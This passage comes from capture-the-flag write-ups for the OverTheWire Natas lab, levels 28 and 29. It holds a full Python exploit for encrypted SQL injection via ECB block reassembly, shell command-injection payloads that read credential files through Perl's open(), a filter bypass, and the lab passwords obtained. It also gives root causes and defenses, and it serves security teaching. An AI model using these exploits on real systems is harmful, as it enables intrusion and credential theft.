3️⃣ Ciphertext Block Reassembly

Reconstruct a new encrypted query by mixing blocks:

[ SAFE PREFIX ] + [ INJECTION BLOCKS ] + [ SAFE TRAILER ]

The server decrypts this into a valid SQL statement containing attacker‑controlled logic.
🧪 Final Exploit Script

#!/usr/bin/env python3
import requests
import base64
import urllib.parse
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
base_url = "http://natas28.natas.labs.overthewire.org"

def get_encrypted(query):
    r = requests.post(base_url, auth=auth, allow_redirects=False, data={'query': query})
    enc = urllib.parse.unquote(r.headers['Location'].split('query=')[1])
    return base64.b64decode(enc)

def search(encrypted_bytes):
    enc_b64 = base64.b64encode(encrypted_bytes).decode()
    url = f"{base_url}/search.php/?query={urllib.parse.quote(enc_b64)}"
    return requests.get(url, auth=auth).text

payload = "AAAAAAAAA' UNION SELECT password FROM users#"

encrypted_injection = get_encrypted(payload)
placeholder = get_encrypted("A" * 10)

# Reassemble ciphertext (block-aligned)
crafted = placeholder[:48] + encrypted_injection[48:-16] + placeholder[-16:]

result = search(crafted)
print(result)

✅ Result

natas29 password:
31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns

The database password is successfully extracted via encrypted SQL injection.
🎯 Root Cause Analysis
Issue	Description
Encryption misuse	AES used without authentication (no MAC / AEAD)
ECB mode	Identical plaintext → identical ciphertext blocks
Trust in encryption	Decrypted input executed without validation
Crypto ≠ Security	Encryption alone does not prevent injection
🛡️ Defensive Recommendations

    Use AEAD modes (AES‑GCM, ChaCha20‑Poly1305)

    Never decrypt and execute user-controlled ciphertext

    Validate input before encryption

    Avoid dynamic SQL construction entirely (use prepared statements)

🧩 Key Takeaway

    Encryption does not make untrusted input safe.
    If attackers control the ciphertext, they control the plaintext.

This challenge highlights a real-world class of vulnerabilities seen in legacy systems and custom cryptographic implementations.
📚 References

    OWASP: Cryptographic Failures

    ECB Block Manipulation Attacks

    SQL Injection via Logic Flaws

    OverTheWire NATAS Wargame




### File: NATAS-Pentest-reports/reports/natas-level-29.md

# Natas Level 29 — Perl Command Injection via `open()`

## Overview
Natas Level 29 contains a vulnerable Perl CGI script that allows **command injection**
through unsafe usage of the two-argument `open()` function.

The vulnerability enables attackers to execute arbitrary shell commands
and read sensitive files on the server.

---

## Root Cause

The backend Perl code effectively performs:

``perl
open(FILE, "perl/$file.txt");

Why this is dangerous

    Perl treats filenames starting with | as shell commands

    User input is not sanitized

    A .txt suffix is appended

    Input is URL-decoded more than once

Primary Exploitation Technique
Double URL Decode + Newline Injection

The application decodes user input twice.

By injecting a double-encoded newline (%250A), we can:

    Break the filename context

    Start a new line

    Execute a shell command using |

Payload

curl -u natas29:<PASSWORD> \
"http://natas29.natas.labs.overthewire.org/index.pl?file=perl%20underground%250A|cat%20/etc/natas_webpass/natas30"

Result

WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH

This is the password for natas30.
Alternative Exploitation Technique
Character Class Filter Bypass

If basic filtering or blacklisting is applied (e.g. blocking the string natas),
Perl and the shell still allow character classes.

The following payload bypasses simple pattern matching:

n[a]tas

Payload

http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/n[a]tas_webpass/n[a]tas30%00

Why it works

    [a] is interpreted as literal a

    Blacklists matching natas fail

    %00 (null byte) terminates the string and bypasses suffixes

Impact

Successful exploitation allows:

    Arbitrary command execution

    Reading sensitive credential files

    Full compromise of the web process

Security Lessons

    Never use Perl two-argument open() with user input

    Always whitelist allowed filenames

    Avoid blacklist-based filtering

    Protect against double URL decoding

    Treat newline characters as dangerous input

Vulnerability Classes

    CWE-78: OS Command Injection

    CWE-20: Improper Input Validation

    CWE-180: Incorrect Behavior Order (Decode → Sanitize)

